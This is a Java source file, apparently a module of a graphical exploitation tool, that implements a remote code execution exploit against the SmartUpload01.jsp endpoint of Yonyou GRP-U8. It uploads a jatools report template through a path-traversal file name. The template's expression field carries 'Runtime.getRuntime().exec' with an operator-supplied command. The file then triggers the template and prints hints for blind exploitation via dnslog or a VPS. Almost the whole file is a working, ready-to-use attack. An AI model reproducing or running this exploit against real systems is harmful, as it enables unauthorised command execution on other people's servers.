package exp.oa.yongyou.grp;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_grpu8_SmartUpload01_RCE implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private static String SmartUpload01(String url , String cmd){
        HashMap head = new HashMap();
        head.put("Content-Type","multipart/form-data; boundary=q4c10ginpgtcuzsmhbyo");
        String var = "--q4c10ginpgtcuzsmhbyo\r\n" +
                "Content-Disposition: form-data; name=\"uname\"\r\n" +
                "\r\n" +
                "../../../../../../../../../R4gtest\r\n" +
                "--q4c10ginpgtcuzsmhbyo\r\n" +
                "Content-Disposition: form-data; name=\"input_localfile\"; filename=\"R4gtest.pdf\"\r\n" +
                "\r\n" +
                "<jatools Class=\"jatools.ReportDocument\" Name=\"jatools report template\">\r\n" +
                "<VariableContext>\r\n" +
                "</VariableContext>\r\n" +
                "<Page>\r\n" +
                "<Name>panel</Name>\r\n" +
                "<Children ItemClass=\"PagePanel\">\r\n" +
                "<Item0>\r\n" +
                "<Name>header</Name>\r\n" +
                "<Width>753</Width>\r\n" +
                "<Height>80</Height>\r\n" +
                "<Children ItemClass=\"Label\">\r\n" +
                "<Item0>\r\n" +
                "<Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>\r\n" +
                "<ForeColor>-65536</ForeColor>\r\n" +
                "<X>41</X>\r\n" +
                "<Y>15</Y>\r\n" +
                "<Width>362</Width>\r\n" +
                "<Height>62</Height>\r\n" +
                "</Item0>\r\n" +
                "</Children>\r\n" +
                "<Type>100</Type>\r\n" +
                "</Item0>\r\n" +
                "<Item1>\r\n" +
                "<Name>footer</Name>\r\n" +
                "<Y>802</Y>\r\n" +
                "<Width>753</Width>\r\n" +
                "<Height>280</Height>\r\n" +
                "<Type>103</Type>\r\n" +
                "</Item1>\r\n" +
                "<Item2>\r\n" +
                "<Name>body</Name>\r\n" +
                "<Y>80</Y>\r\n" +
                "<Width>753</Width>\r\n" +
                "<Height>722</Height>\r\n" +
                "<Children ItemClass=\"Table\">\r\n" +
                "<Item0>\r\n" +
                "<NodePath>学生表</NodePath>\r\n" +
                "<X>115</X>\r\n" +
                "<Y>77</Y>\r\n" +
                "<Children>\r\n" +
                "<Item0 Class=\"Label\">\r\n" +
                "<Text>家庭成员</Text>\r\n" +
                "<Border/>\r\n" +
                "<PrintStyle>united-level:1;</PrintStyle>\r\n" +
                "<Cell>\r\n" +
                "<Row>3</Row>\r\n" +
                "<Col>0</Col>\r\n" +
                "<RowSpan>2</RowSpan>\r\n" +
                "</Cell>\r\n" +
                "</Item0>\r\n" +
                "<Item1 Class=\"Label\">\r\n" +
                "<Text>关系</Text>\r\n" +
                "<BackColor>-4144897</BackColor>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>3</Row>\r\n" +
                "<Col>1</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item1>\r\n" +
                "<Item2 Class=\"Label\">\r\n" +
                "<Text>性别</Text>\r\n" +
                "<BackColor>-4144897</BackColor>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>3</Row>\r\n" +
                "<Col>2</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item2>\r\n" +
                "<Item3 Class=\"Label\">\r\n" +
                "<Text>年龄</Text>\r\n" +
                "<BackColor>-4144897</BackColor>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>3</Row>\r\n" +
                "<Col>3</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item3>\r\n" +
                "<Item4 Class=\"Label\">\r\n" +
                "<Text>得分</Text>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>2</Row>\r\n" +
                "<Col>0</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item4>\r\n" +
                "<Item5 Class=\"Label\">\r\n" +
                "<Text>性别</Text>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>1</Row>\r\n" +
                "<Col>0</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item5>\r\n" +
                "<Item6 Class=\"Label\">\r\n" +
                "<Text>姓名</Text>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>0</Row>\r\n" +
                "<Col>0</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item6>\r\n" +
                "<Item7 Class=\"Text\">\r\n" +
                "<Variable>=$学生表</Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>0</Row>\r\n" +
                "<Col>1</Col>\r\n" +
                "<ColSpan>3</ColSpan>\r\n" +
                "</Cell>\r\n" +
                "</Item7>\r\n" +
                "<Item8 Class=\"Text\">\r\n" +
                "<Variable>=$学生表.value()</Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>1</Row>\r\n" +
                "<Col>1</Col>\r\n" +
                "<ColSpan>3</ColSpan>\r\n" +
                "</Cell>\r\n" +
                "</Item8>\r\n" +
                "<Item9 Class=\"Text\">\r\n" +
                "<Variable>=$学生表.getName()</Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>2</Row>\r\n" +
                "<Col>1</Col>\r\n" +
                "<ColSpan>3</ColSpan>\r\n" +
                "</Cell>\r\n" +
                "</Item9>\r\n" +
                "<Item10 Class=\"RowPanel\">\r\n" +
                "<Cell>\r\n" +
                "<Row>4</Row>\r\n" +
                "<Col>0</Col>\r\n" +
                "<ColSpan>4</ColSpan>\r\n" +
                "</Cell>\r\n" +
                "<Children ItemClass=\"Text\">\r\n" +
                "<Item0>\r\n" +
                "<Variable></Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>4</Row>\r\n" +
                "<Col>3</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item0>\r\n" +
                "<Item1>\r\n" +
                "<Variable></Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>4</Row>\r\n" +
                "<Col>2</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item1>\r\n" +
                "<Item2>\r\n" +
                "<Variable>;</Variable>\r\n" +
                "<Border/>\r\n" +
                "<Cell>\r\n" +
                "<Row>4</Row>\r\n" +
                "<Col>1</Col>\r\n" +
                "</Cell>\r\n" +
                "</Item2>\r\n" +
                "</Children>\r\n" +
                "<NodePath>成员</NodePath>\r\n" +
                "</Item10>\r\n" +
                "</Children>\r\n" +
                "<ColumnWidths>60,60,60,60</ColumnWidths>\r\n" +
                "<RowHeights>20,20,20,20,20</RowHeights>\r\n" +
                "</Item0>\r\n" +
                "</Children>\r\n" +
                "<Type>102</Type>\r\n" +
                "</Item2>\r\n" +
                "</Children>\r\n" +
                "</Page>\r\n" +
                "<NodeSource>\r\n" +
                "<Children ItemClass=\"ArrayNodeSource\">\r\n" +
                "<Item0>\r\n" +
                "<Children ItemClass=\"ArrayNodeSource\">\r\n" +
                "<Item0>\r\n" +
                "<TagName>成员</TagName>\r\n" +
                "<Expression>$.value()</Expression>\r\n" +
                "</Item0>\r\n" +
                "</Children>\r\n" +
                "<TagName>学生表</TagName>\r\n" +
                "<Expression>"+cmd+"</Expression>\r\n" +
                "</Item0>\r\n" +
                "</Children>\r\n" +
                "</NodeSource>\r\n" +
                "</jatools>\r\n" +
                "--q4c10ginpgtcuzsmhbyo--";
        Response res = HttpTools.post(url+"/u8qx/SmartUpload01.jsp",var,head,"utf-8");
        if(res.getCode()==200 && res.getText().contains("R4gtest.pdf")){
            Response res2 = HttpTools.get(url+"/jatoolsreport?file=/R4gtest.pdf&as=dhtml",new HashMap<>(),"utf-8");
            if(res2.getCode()==200){
                return url+"/jatoolsreport?file=/R4gtest.pdf&as=dhtml";
            }
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
//
            String result = SmartUpload01(url,"new Object[]{10*10}");


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_grpu8_SmartUpload01_RCE ]");
                    textArea.appendText("\n 文件上传成功: "+result);

                    textArea.appendText("\n CMD处输入命令,无回显利用");
                    textArea.appendText("\n eg: ping dnslog.cn");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        try {
            String result = SmartUpload01(url,"Runtime.getRuntime().exec(\""+pass+"\")");


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 上传文件地址: "+result);
                    textArea.appendText("\n 无回显利用借助vps");
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
}
